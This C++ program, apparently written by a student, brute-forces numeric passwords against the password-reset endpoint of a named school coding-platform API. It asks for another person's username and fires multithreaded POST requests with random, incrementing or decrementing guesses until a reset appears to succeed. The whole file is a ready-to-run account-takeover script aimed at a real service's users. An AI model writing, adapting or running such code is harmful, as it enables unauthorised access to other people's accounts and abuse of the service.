#define CPPHTTPLIB_OPENSSL_SUPPORT
#include <iostream>
#include <unistd.h>
#include <memory>
#include <any>
#include <string> 
#include <cstdlib>
#include <bits/stdc++.h>
#include <cmath>
#include <stdlib.h>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <vector>
#include <chrono>
#include "httplib.h"


//send requests to a pltw server, doing this for a class beacause mit app inventor is rotting my brain more than helping. 
// WEBSITE IS https://cs-api.pltw.org/
// Thx for the lib, its at https://github.com/yhirose/cpp-httplib
std::unordered_set<int> tried_numbers;
int randomnumber;
std::string USERP;
std::string PASSWORDP;
int amntoftimes;
int GetUserNameAndAmount();
int SendReq();
int SendReqUP();
int SendReqDown();
int guessdown();
int guess();
int guessup();
int randomnumberUP = 990;
int menuswitch;
int randomnumberDOWN = 10015;

int menu(){
    std::cout << "What would you like?\n" << "1:Random Num\n" << "2:Up By One (1000 -> 1001)\n" << "3:Down By One(9999 -> 9998)" << "\n4:Do all" << "\n Select:";
    std::cin >> menuswitch;
    switch(menuswitch){
        case 1:{
        int numthreads;
        std::cout << "How many threads:";
        std::cin >> numthreads;
         std::vector<std::thread> threads;
        for (int i = 0; i < numthreads; ++i){
            threads.push_back(std::thread(guess));
        }for (auto &th : threads){
            th.join();
        }
        }
        break;
        
        case 2:{
        int numthreads;
        std::cout << "How many threads:";
        std::cin >> numthreads;
         std::vector<std::thread> threads;
        for (int i = 0; i < numthreads; ++i){
            threads.push_back(std::thread(guessup));
        }for (auto &th : threads){
            th.join();
        }
        }
        break;

        case 3:{
        int numthreads;
        std::cout << "How many threads:";
        std::cin >> numthreads;
         std::vector<std::thread> threads;
        for (int i = 0; i < numthreads; ++i){
            threads.push_back(std::thread(guessdown));
        }for (auto &th : threads){
            th.join();
        }
        }
        break;

        case 4:{
        int numthreads;
        std::cout << "How many threads:";
        std::cin >> numthreads;
         std::vector<std::thread> threads;
        for (int i = 0; i < numthreads; ++i){
            if (i % 3 == 0){
                threads.push_back(std::thread(guess));
            } else if (i % 2 == 0){
                threads.push_back(std::thread(guessdown));
            }
            else {
                threads.push_back(std::thread(guessup));
            }
        }
        for (auto &th : threads){
            th.join();
        }
        break;
    }
        default:
         std::cout << "Invalid option, please try again.\n";
         menu();
         break;
}
return 0;
}
int guess(){
 if (amntoftimes != 0){
    amntoftimes -= 1;
    unsigned int seed = static_cast<unsigned int>(std::chrono::system_clock::now().time_since_epoch().count());
        srand(seed);
        randomnumber = rand() % randomnumberDOWN + randomnumberUP;
    std::cout << "Password Being Tried:" << randomnumber << "\n";
     SendReq();
     }else{
        std::cout << "Done. Didnt unlock it?\n";
         exit(0);
     }
     return(0);
}

int guessup(){
    if (amntoftimes != 0){
     amntoftimes -= 1;
     randomnumberUP += 1; 
     std::cout << "Password Being Tried (+1):" << randomnumberUP << "\n";
     SendReqUP();
    }
    return(0);
}

int guessdown(){
    if(amntoftimes != 0){
    amntoftimes -= 1;
    randomnumberDOWN -= 1;
    std::cout << "Password Being Tried (-1):" << randomnumberDOWN << "\n";
    SendReqDown();
       }
       return(0);
}

int SendReqUP(){
    httplib::Client* client = new httplib::Client("https://cs-api.pltw.org");
    std::string endpoint = "/" + USERP + "/reset?password=" + std::to_string(randomnumberUP);
    auto res = client->Post(endpoint.c_str(), "", "text/plain");

    if (res){
        std::cout << "Response" << res->body << "\n";
         if(res->body.find(USERP) != std::string::npos){
          std::cout << "Password reset successful for user " << USERP << ".\n";
            exit(0); }
    }else{
        std::cerr << "Request Failed. (Rate limited?)\n";
    }
    delete client;
        guessup();
    return res ? res->status : -1;
}

int SendReqDown(){
    httplib::Client* client = new httplib::Client("https://cs-api.pltw.org");
    std::string endpoint = "/" + USERP + "/reset?password=" + std::to_string(randomnumberDOWN);
    auto res = client->Post(endpoint.c_str(), "", "text/plain");

    if (res){
        std::cout << "Response" << res->body << "\n";
         if(res->body.find(USERP) != std::string::npos){
          std::cout << "Password reset successful for user " << USERP << ".\n";
            exit(0); }
    }else{
        std::cerr << "Request Failed. (Rate limited?)\n";
    }
    delete client;
        guessdown();
    return res ? res->status : -1;
}

int SendReq(){
    httplib::Client* client = new httplib::Client("https://cs-api.pltw.org");
    std::string endpoint = "/" + USERP + "/reset?password=" + std::to_string(randomnumber);
    auto res = client->Post(endpoint.c_str(), "", "text/plain");

    if (res){;
        std::cout << "Response" << res->body << "\n";
         if(res->body.find(USERP) != std::string::npos){
          std::cout << "Password reset successful for user " << USERP << ".\n";
            exit(0); }
    }else{
        std::cerr << "Request Failed. (Rate limited?)\n";
    }
    delete client;
        guess();
    return res ? res->status : -1;
}


int GetUserNameAndAmount(){
    std::cout << "Whats their username:";
    std::getline(std::cin, USERP);
    std::cout << "\nWhats the amout you want (Suggested 9999):";
    std::cin >> amntoftimes;
    menu();
return(0);

}

int main(){
GetUserNameAndAmount(); 

return(0);
}
